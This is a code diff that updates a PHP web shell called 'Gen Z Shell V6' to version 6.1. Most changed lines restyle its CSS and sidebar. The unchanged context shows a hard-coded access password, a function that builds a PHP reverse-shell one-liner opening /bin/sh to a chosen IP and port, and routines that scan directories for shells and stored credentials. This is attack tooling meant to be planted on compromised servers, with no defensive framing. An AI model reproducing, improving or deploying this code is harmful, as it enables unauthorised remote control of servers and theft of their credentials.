@@ -2,7 +2,7 @@
 session_start();
 
 // -------------------- CONFIG --------------------
-$password = 'genz123'; // 🔐 Ganti password di sini
+$password = 'genz123';
 
 // -------------------- AUTH --------------------
 if (!isset($_SESSION['auth'])) {
@@ -73,7 +73,7 @@ function reverseShellCode($ip, $port) {
     return "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
 }
 
-// Shell Detector (simple pattern based)
+// Shell Detector
 function scanShells($dir) {
     $found = [];
     $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
@@ -104,25 +104,38 @@ function scanCreds($dir) {
 <!DOCTYPE html>
 <html>
 <head>
-<title>Gen Z Shell V6 🔥</title>
+<title>Gen Z Shell V6.1 🔥</title>
 <style>
-body { background:#111; color:#eee; font-family:Consolas, monospace; padding:20px; }
+body { background:#111; color:#eee; font-family:Consolas, monospace; margin:0; }
 a { color:#6cf; text-decoration:none; }
 a:hover { text-decoration:underline; }
 h1 { color:#f55; }
 input,button,textarea { padding:5px 10px; margin:5px; border-radius:5px; }
 pre { background:#222; padding:10px; overflow:auto; }
-.sidebar { position:fixed; top:0; left:0; bottom:0; width:260px; background:#000; padding:20px; border-right:2px solid #333; }
-.content { margin-left:280px; }
+.sidebar { 
+    position:fixed; 
+    top:0; 
+    left:0; 
+    bottom:0; 
+    width:260px; 
+    background:#000; 
+    padding:20px; 
+    border-right:2px solid #333; 
+    overflow-y:auto; 
+    height:100vh;
+}
+.content { margin-left:280px; padding:20px; }
+.file-item { display:flex; justify-content:space-between; align-items:center; margin-bottom:5px; }
+.file-name { flex:1; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
 </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <h1>🔥 Gen Z V6</h1>
+    <h1>🔥 Gen Z V6.1</h1>
     <p><b>Current Dir:</b> <?php echo htmlspecialchars($cwd); ?></p>
     <p><a href="?">Home</a></p>
-    <ul>
+    <ul style="list-style:none;padding:0;">
     <?php
     $files = @scandir($cwd);
     if ($cwd != $baseDir) {
@@ -132,7 +145,7 @@ pre { background:#222; padding:10px; overflow:auto; }
         if ($f === ".") continue;
         $path = $cwd . DIRECTORY_SEPARATOR . $f;
         $link = "?dir=" . urlencode($path);
-        echo "<li>". (is_dir($path) ? "📂" : "📄") ." <a href='$link'>$f</a></li>";
+        echo "<li class='file-item'>". (is_dir($path) ? "📂" : "📄") ." <a class='file-name' href='$link'>$f</a></li>";
     }
     ?>
     </ul>
